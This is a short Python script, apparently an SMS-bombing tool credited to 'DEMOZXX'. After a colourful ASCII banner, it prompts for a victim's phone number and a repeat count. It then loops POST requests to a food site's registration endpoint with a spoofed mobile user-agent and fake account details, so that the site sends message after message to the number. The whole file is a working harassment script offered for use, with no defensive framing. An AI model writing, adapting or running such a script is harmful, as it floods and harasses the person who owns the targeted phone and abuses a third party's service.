
import requests,json,os,sys
print (""" \033[91m╔╗╔╗╔╦═══╦╗╔═╦╗─╔╦╗──╔══╦═╗─╔╦═══╦═══╗
 \033[91m║║║║║║╔═╗║║║╔╣║─║║║──╚╣╠╣║╚╗║║╔══╣╔═╗║
 \033[94m║║║║║║║─║║╚╝╝║║─║║║───║║║╔╗╚╝║╚══╣╚═╝║
 \033[91m║╚╝╚╝║╚═╝║╔╗║║║─║║║─╔╗║║║║╚╗║║╔══╣╔╗╔╝
 \033[97m╚╗╔╗╔╣╔═╗║║║╚╣╚═╝║╚═╝╠╣╠╣║─║║║╚══╣║║╚╗
 \033[92m─╚╝╚╝╚╝─╚╩╝╚═╩═══╩═══╩══╩╝─╚═╩═══╩╝╚═╝
 \033[93mAUTOR    =DEMOZXX """)
yu = input(' target number (ex:088118) ; ')
eek = int(input('the amount : '))
hd  = {'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}
dat = {'nama':'Anker+Produc','email_register':'anker11%40gmail.com','hp':yu,'ulang_tahun':'01%2F01%2F1975','pass':'ankerproduction123','jns_kelamin':'1'}
for x in range(eek):
 ho = requests.post('https://www.wakuliner.com/main/reg13',headers=hd,data=dat)
 kntl = json.loads(ho.text)
 if kntl["status"] == 1:
    print("successfully sent no "+yu)
 else:
    print("Failed to send no "+yu)
